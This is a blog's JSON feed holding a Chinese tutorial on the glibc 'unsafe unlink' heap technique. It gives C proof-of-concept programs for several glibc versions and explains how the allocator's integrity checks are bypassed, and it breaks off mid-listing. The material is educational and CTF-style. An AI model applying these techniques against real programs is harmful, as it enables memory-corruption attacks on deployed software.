{
    "version": "https://jsonfeed.org/version/1",
    "title": "xsh 的世界",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/07/13/test-bolg/",
            "url": "http://example.com/2024/07/13/test-bolg/",
            "title": "test bolg",
            "date_published": "2024-07-13T10:23:23.000Z",
            "content_html": "<p><img src=\"/2024/07/13/test-bolg/0030168d93298d4ff97ad3cdd8757d36.png\"></p>\n<p>测试博客<img src=\"/2024/07/13/test-bolg/1308265773_233027cbd1e271924f052fd455f533b0.jpg\"></p>\n<p><img src=\"/2024/07/13/test-bolg/ee68ea1fa0b9956f35ed3346382001b69c14c1358c18c1a7a.jpg\"></p>\n<h2 id=\"unsafe-unlink-end\"><a href=\"#unsafe-unlink-end\" class=\"headerlink\" title=\"unsafe unlink(end)\"></a>unsafe unlink(end)</h2><h4 id=\"适用范围：\"><a href=\"#适用范围：\" class=\"headerlink\" title=\"适用范围：\"></a>适用范围：</h4><p>​\t2.23 ~ 至今</p>\n<h4 id=\"攻击方法：\"><a href=\"#攻击方法：\" class=\"headerlink\" title=\"攻击方法：\"></a>攻击方法：</h4><p>​\t当知道堆块指针存放的地址（ptr）时候（如未开启 PIE 或者已泄露 pro_base），如果能够通过 （堆溢出、off by one、off by null） 溢出写一个 \\x00 ，那么，就可以修改相邻下一个 chunk 的 prev size 和 size 的 p 位，接下来通过 free 该 chunk 触发向后合并，来触发 unlink，使堆块指针存放的地址（ptr）处被修改为 ptr - 0x18</p>\n<p>​\t在堆题普遍开启了 PIE 的情况下，unlink 攻击的难点在于获取存放堆块指针的地址</p>\n<h4 id=\"2-23-2-24：\"><a href=\"#2-23-2-24：\" class=\"headerlink\" title=\"2.23 ~ 2.24：\"></a>2.23 ~ 2.24：</h4><h5 id=\"利用-Poc：\"><a href=\"#利用-Poc：\" class=\"headerlink\" title=\"利用 Poc：\"></a>利用 Poc：</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x80</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t# 申请一个 <span class=\"number\">0x80</span> 大小的 chunk，堆块指针存放在 bss 上</span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">    # 申请一个 <span class=\"number\">0x80</span> 大小的 chunk</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t# 伪造 fd = ptr - <span class=\"number\">0x18</span> / bk = ptr - <span class=\"number\">0x10</span></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    # 伪造相邻下一个 chunk 的 prev size 和 size 的 p 位</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">    # 触发向后合并，调用 unlink 函数</span><br><span class=\"line\">    # chunk0_ptr = &amp;chunk0_ptr - <span class=\"number\">0x18</span></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    # 修改 chunk0_ptr = &amp;victim_string</span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string, <span class=\"string\">&quot;Hello!~&quot;</span>);    </span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 修改 victim_string = <span class=\"number\">0x4141414142424242</span>LL</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞原理：\"><a href=\"#漏洞原理：\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h5><p>这是 _int_free 函数中触发向后合并的代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">\t# 如果当前释放堆块的 p 位是 <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      # 进行向后合并</span><br><span class=\"line\">      prevsize = p-&gt;prev_size;</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      # 根据 prev size 来寻找当前释放堆块的上一个相邻堆块的地址</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      # 进行 unlink 操作</span><br><span class=\"line\">      unlink(av, p, bck, fwd);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中 unlink 是一个宏定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class=\"line\">    FD = P-&gt;fd;\t\t\t\t\t\t\t\t      </span><br><span class=\"line\">    BK = P-&gt;bk;\t\t\t\t\t\t\t\t      </span><br><span class=\"line\">    # 检查双向链表的完整性，确保没被篡改</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))\t\t      </span><br><span class=\"line\">      malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        # 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class=\"line\">        FD-&gt;bk = BK;\t\t\t\t\t\t\t      </span><br><span class=\"line\">        BK-&gt;fd = FD;</span><br><span class=\"line\"> \t\t# 如果 <span class=\"built_in\">free</span> chunk 属于 small bins 并且 fd_nextsize 不为空，则进行 fd_nextsize 和 bk_nextsize 的更新操作</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_smallbin_range (P-&gt;size)\t\t\t\t      </span><br><span class=\"line\">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">       \t\t<span class=\"comment\">/***/</span></span><br><span class=\"line\">              &#125;\t\t\t\t\t\t\t\t      </span><br><span class=\"line\">      &#125;\t\t\t\t\t\t\t\t      </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过阅读上面的代码，我们可以知道，当执行到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unlink(av, P, bck, fwd);</span><br></pre></td></tr></table></figure>\n\n<p>时候，由于 p &#x3D; chunk_at_offset(p, -((long) prevsize)); ，其中 p 已经指向我们在 chunk0 中伪造的 fake_chunk 了</p>\n<p>进入 unlink 后，此时可以知道</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = &amp;fake_chunk_head</span><br><span class=\"line\">chunk0_ptr = &amp;chunk0_user_data = &amp;fake_chunk_head = P</span><br><span class=\"line\"></span><br><span class=\"line\">FD = P -&gt; fd = &amp;chunk0_ptr - 0x18</span><br><span class=\"line\">BK = P -&gt; bk = &amp;chunk0_ptr - 0x10</span><br></pre></td></tr></table></figure>\n\n<p>因此</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FD -&gt; bk = *(&amp;chunk0_ptr - 0x18) -&gt; bk = *(&amp;chunk0_ptr - 0x18 + 0x18) = *(&amp;chunk0_ptr) = chunk0_ptr = P</span><br><span class=\"line\">BK -&gt; fd = *(&amp;chunk0_ptr - 0x10) -&gt; fd = *(&amp;chunk0_ptr - 0x10 + 0x10) = &amp;(&amp;chunk0_ptr) = chunk0_ptr = P</span><br></pre></td></tr></table></figure>\n\n<p>那么就能够绕过</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 检查双向链表的完整性，确保没被篡改</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))\t\t      </span><br><span class=\"line\">      malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure>\n\n<p>之后，由于要从 unsorted bins 的双向链表中取出 fake chunk，那么</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class=\"line\">      \tFD-&gt;bk = BK;\t\t\t\t\t\t\t      </span><br><span class=\"line\">        BK-&gt;fd = FD;</span><br><span class=\"line\">FD -&gt; bk = P = chunk0_ptr / BK = &amp;chunk0_ptr - <span class=\"number\">0x10</span></span><br><span class=\"line\">BK -&gt; fd = P = chunk0_ptr / FD = &amp;chunk0_ptr - <span class=\"number\">0x18</span></span><br></pre></td></tr></table></figure>\n\n<p>那么，最后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># chunk0_ptr 被修改两次</span><br><span class=\"line\">chunk0_ptr = &amp;chunk0_ptr - <span class=\"number\">0x10</span></span><br><span class=\"line\">chunk0_ptr = &amp;chunk0_ptr - <span class=\"number\">0x18</span></span><br></pre></td></tr></table></figure>\n\n<p>也就是能够实现在 ptr 处写入 &amp;ptr - 0x18 的攻击效果</p>\n<h4 id=\"2-27：\"><a href=\"#2-27：\" class=\"headerlink\" title=\"2.27：\"></a>2.27：</h4><h5 id=\"利用Poc\"><a href=\"#利用Poc\" class=\"headerlink\" title=\"利用Poc:\"></a>利用Poc:</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与 2.23 对比，由于 tcache bins 的加入，所以调整了申请的 chunk 的大小，好直接放入 unsorted bins</p>\n<p>在实战中，倘若堆块申请的大小有限制，一般先把 tcache bins 填满</p>\n<h5 id=\"漏洞原理：-1\"><a href=\"#漏洞原理：-1\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h5><p>与 2.23 相比一样，但是在 2.26 之后，包括 2.27 中的 unlink 宏定义增加了一个检测</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class=\"number\">0</span>))      </span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);\t\t\t      </span><br><span class=\"line\">    FD = P-&gt;fd;\t\t\t\t\t\t\t\t      </span><br><span class=\"line\">    BK = P-&gt;bk;</span><br><span class=\"line\">\t<span class=\"comment\">/***/</span></span><br></pre></td></tr></table></figure>\n\n<p>这里主要是为了检测下一个堆块的 prev size 和当前堆块的 size 是否相同</p>\n<p>这里有两个绕过方法，一是修改 fake chunk 的 size 与下一个堆块的 prev size 相同，二是像 Poc 那样不去修改令其为 0（fake chunk 的prev size 也需为 0 ）</p>\n<p>第一个方法会比较好理解，第二个方法原理如下</p>\n<p>其中 next_chunk 也是一个宏定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br></pre></td></tr></table></figure>\n\n<p>而 p 指向了 fake chunk，fake chunk 的 size 为 0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chunksize(p) = <span class=\"number\">0</span></span><br><span class=\"line\">prev_size (next_chunk(P)) = prev_size(P) = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>这样，如果 fake chunk 的 prev size 和 size 相等都为 0 ，也是可以绕过这个检测的</p>\n<h4 id=\"2-31-2-36：\"><a href=\"#2-31-2-36：\" class=\"headerlink\" title=\"2.31 ~ 2.36：\"></a>2.31 ~ 2.36：</h4><h5 id=\"利用-Poc：-1\"><a href=\"#利用-Poc：-1\" class=\"headerlink\" title=\"利用 Poc：\"></a>利用 Poc：</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t# 伪造 fake chunk 的 size</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">1</span>] = chunk0_ptr[<span class=\"number\">-1</span>] - <span class=\"number\">0x10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞原理：-2\"><a href=\"#漏洞原理：-2\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h5><p>在 2.31 之后，__int_free 函数中对于向后合并的代码迎来了较大改动</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = prev_size (p);</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      # 检测当前堆块的 size 是否和 prevsize 相等</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class=\"line\">      unlink_chunk (av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>而 unlink 也从宏定义转变成了 unlink_chunk 函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 